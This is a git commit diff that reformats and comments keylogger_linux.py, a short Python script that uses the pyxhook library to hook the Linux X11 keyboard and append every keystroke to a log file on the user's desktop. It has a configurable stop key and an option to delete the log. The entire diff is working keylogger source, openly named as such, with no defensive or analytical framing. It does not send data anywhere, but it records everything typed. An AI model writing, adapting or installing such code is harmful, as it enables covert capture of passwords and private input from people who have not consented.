19f2a67d48ef20b5ded3420e03ac25b9c8086d26
Ashoksanaka <145904608+Ashoksanaka@users.noreply.github.com>
2024-03-12 00:03:28 +0530

    keylogger_linux.py

--- keylogger_linux.py
+++ keylogger_linux.py
@@ -1,41 +1,49 @@
+# Import necessary libraries
+import os
+import pyxhook
 
-import os 
-import pyxhook 
+# Define the log file path either from the environment variable or default to desktop
+log_file = os.environ.get(
+    'pylogger_file',
+    os.path.expanduser('~/Desktop/file.log')
+)
 
-log_file = os.environ.get( 
-	'pylogger_file', 
-	os.path.expanduser('~/Desktop/file.log') 
-) 
+# Define the key to cancel logging, defaulting to '`' if not specified
+cancel_key = ord(
+    os.environ.get(
+        'pylogger_cancel',
+        '`'
+    )[0]
+)
 
-cancel_key = ord( 
-	os.environ.get( 
-		'pylogger_cancel', 
-		'`'
-	)[0] 
-) 
+# If specified, clean the log file
+if os.environ.get('pylogger_clean', None) is not None:
+    try:
+        os.remove(log_file)
+    except EnvironmentError:
+        pass
 
-if os.environ.get('pylogger_clean', None) is not None: 
-	try: 
-		os.remove(log_file) 
-	except EnvironmentError: 
-	
-		pass
+# Function to handle key press events and log them to the file
+def OnKeyPress(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.Key))
 
-def OnKeyPress(event): 
-	with open(log_file, 'a') as f: 
-		f.write('{}\n'.format(event.Key)) 
+# Create a new hook manager instance
+new_hook = pyxhook.HookManager()
 
-new_hook = pyxhook.HookManager() 
-new_hook.KeyDown = OnKeyPress 
- 
-new_hook.HookKeyboard() 
-try: 
-	new_hook.start()
+# Assign the OnKeyPress function to handle KeyDown events
+new_hook.KeyDown = OnKeyPress
 
-	pass
-except Exception as ex: 
+# Hook the keyboard
+new_hook.HookKeyboard()
 
-	msg = 'Error while catching events:\n {}'.format(ex) 
-	pyxhook.print_err(msg) 
-	with open(log_file, 'a') as f: 
-		f.write('\n{}'.format(msg)) 
+try:
+    # Start capturing keyboard events
+    new_hook.start()
+except Exception as ex:
+    # Handle exceptions
+    msg = 'Error while catching events:\n {}'.format(ex)
+    pyxhook.print_err(msg)
+    with open(log_file, 'a') as f:
+        f.write('\n{}'.format(msg))
+
